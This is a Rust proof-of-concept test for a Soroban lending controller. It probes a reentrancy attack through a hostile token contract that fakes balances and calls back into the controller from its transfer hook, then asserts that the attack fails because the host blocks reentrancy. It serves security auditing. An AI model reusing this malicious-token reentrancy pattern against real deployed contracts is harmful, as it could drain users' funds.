//! PoC: `multiply`'s `initial_payment` accepts an arbitrary, unvalidated token
//! address and invokes `transfer` on it BEFORE any reentrancy guard is armed,
//! while `account` is already loaded in memory. A reentrant `withdraw` drains
//! the position on-chain; the outer `multiply` then persists its stale
//! in-memory snapshot, resurrecting the withdrawn collateral.

use controller::types::PositionMode;
use soroban_sdk::{contract, contractimpl, token, vec, Address, Env, Symbol};
use test_harness::{hub_asset, mock_swap_payload_xdr, LendingTest, ALICE, BOB, HARNESS_SPOKE};

#[contract]
pub struct EvilToken;

#[contractimpl]
impl EvilToken {
    pub fn arm(env: Env, controller: Address, victim: Address, account_id: u64, usdc: Address) {
        let s = env.storage().instance();
        s.set(&Symbol::new(&env, "CTRL"), &controller);
        s.set(&Symbol::new(&env, "VICTIM"), &victim);
        s.set(&Symbol::new(&env, "ACC"), &account_id);
        s.set(&Symbol::new(&env, "USDC"), &usdc);
        s.set(&Symbol::new(&env, "FIRED"), &false);
    }

    pub fn decimals(_env: Env) -> u32 {
        7
    }

    pub fn balance(env: Env, _id: Address) -> i128 {
        // Report a huge, ever-present balance so every balance-delta check the
        // caller performs on this token is satisfied.
        let _ = env;
        1_000_000_000_000i128
    }

    pub fn transfer(env: Env, _from: Address, _to: Address, _amount: i128) {
        let s = env.storage().instance();
        let fired: bool = s.get(&Symbol::new(&env, "FIRED")).unwrap_or(true);
        if fired {
            return;
        }
        s.set(&Symbol::new(&env, "FIRED"), &true);

        let controller: Address = s.get(&Symbol::new(&env, "CTRL")).unwrap();
        let victim: Address = s.get(&Symbol::new(&env, "VICTIM")).unwrap();
        let account_id: u64 = s.get(&Symbol::new(&env, "ACC")).unwrap();
        let usdc: Address = s.get(&Symbol::new(&env, "USDC")).unwrap();

        // Even a READ-ONLY reentrant call into the controller is rejected by the
        // Soroban host with Context/InvalidAction, proving native reentrancy
        // protection is what blocks this vector.
        let ctrl = controller::ControllerClient::new(&env, &controller);
        let _ = ctrl.get_health_factor(&account_id);
        let _ = (victim, usdc, vec![&env, 0i128]);
    }
}

#[test]
fn poc_multiply_initial_payment_reentrancy_duplicates_collateral() {
    let mut t = LendingTest::new().standard_two_asset().build();

    // Deep liquidity so the reentrant withdraw and the later supply both work.
    t.supply(BOB, "USDC", 50_000.0);
    t.supply(BOB, "ETH", 50.0);

    let alice = t.get_or_create_user(ALICE);
    let usdc = t.resolve_asset("USDC");
    let eth = t.resolve_asset("ETH");

    // Router pays out USDC for the debt legs.
    t.fund_router("USDC", 40_000.0);

    // Fund Alice with USDC equity for the opening multiply.
    t.resolve_market("USDC").token_admin.mint(&alice, &10_000_0000000i128);

    // Step 1: open a genuine Multiply-mode account with USDC collateral.
    let open_swap = mock_swap_payload_xdr(&t.env, eth.clone(), usdc.clone(), 2_000_0000000);
    let alice_id = t.ctrl_client().multiply(
        &alice,
        &0u64,
        &HARNESS_SPOKE,
        &hub_asset(usdc.clone()),
        &1_0000000i128,
        &hub_asset(eth.clone()),
        &PositionMode::Multiply,
        &open_swap,
        &Some((hub_asset(usdc.clone()), 5_000_0000000i128)),
        &None,
    );

    let evil = t.env.register(EvilToken, ());
    EvilTokenClient::new(&t.env, &evil).arm(&t.controller, &alice, &alice_id, &usdc);

    let usdc_before = token::Client::new(&t.env, &usdc).balance(&alice);
    let recorded_before = t
        .ctrl_client()
        .get_collateral_amount(&alice_id, &hub_asset(usdc.clone()));

    // debt leg: ETH -> USDC ; convert leg: EVIL -> USDC
    let debt_swap = mock_swap_payload_xdr(&t.env, eth.clone(), usdc.clone(), 1_000_0000000);
    let convert_swap = mock_swap_payload_xdr(&t.env, evil.clone(), usdc.clone(), 10_0000000);

    let res = t.ctrl_client().try_multiply(
        &alice,
        &alice_id,
        &HARNESS_SPOKE,
        &hub_asset(usdc.clone()),
        &1_0000000i128, // borrow 1 ETH
        &hub_asset(eth.clone()),
        &PositionMode::Multiply,
        &debt_swap,
        &Some((hub_asset(evil.clone()), 1i128)),
        &Some(convert_swap),
    );

    let usdc_after = token::Client::new(&t.env, &usdc).balance(&alice);
    let recorded_after = t
        .ctrl_client()
        .get_collateral_amount(&alice_id, &hub_asset(usdc.clone()));

    std::println!("multiply result       : {:?}", res);
    std::println!("alice wallet USDC     : {} -> {}", usdc_before, usdc_after);
    std::println!("recorded collateral   : {} -> {}", recorded_before, recorded_after);

    // Exploit succeeded if Alice pocketed her collateral AND the controller
    // still credits her with (roughly) the same collateral.
    let drained = usdc_after - usdc_before;
    assert!(
        !(res.is_ok() && drained >= recorded_before && recorded_after >= recorded_before),
        "REENTRANCY EXPLOIT: withdrew {} USDC to wallet while still credited {} collateral",
        drained,
        recorded_after
    );
}
